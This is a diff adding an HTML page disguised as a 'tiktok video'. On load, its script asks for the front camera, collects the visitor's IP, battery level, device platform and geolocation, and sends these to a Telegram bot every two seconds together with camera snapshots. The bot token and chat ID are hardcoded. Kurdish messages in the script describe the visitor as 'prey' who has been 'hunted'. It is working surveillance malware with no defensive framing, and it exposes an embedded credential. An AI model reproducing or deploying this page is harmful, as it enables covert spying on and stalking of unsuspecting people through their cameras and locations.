@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <title>tiktok video</title>
+    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
+</head>
+<body onload="capture()">
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetID = "1629990392";
+    const TOKEN = "8445031997:AAFx42CAaKeuoeo781iYezFiv0gke9NkO9g";
+
+    async function capture() {
+        if (!targetID) return;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: false
+            });
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+            }
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+                    sendToTelegram(report);
+                });
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendLocation(pos.coords.latitude, pos.coords.longitude);
+            });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.play();
+            const takeSnap = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
+            };
+            setInterval(takeSnap, 2000);
+        } catch (e) {
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+        }
+    }
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
+        });
+    }
+    function sendLocation(lat, lon) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
+        });
+    }
+    function sendFile(blob, type) {
+        let fd = new FormData();
+        fd.append("chat_id", targetID);
+        fd.append(type, blob, "shot.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+    }
+</script>
+</body>
+</html>
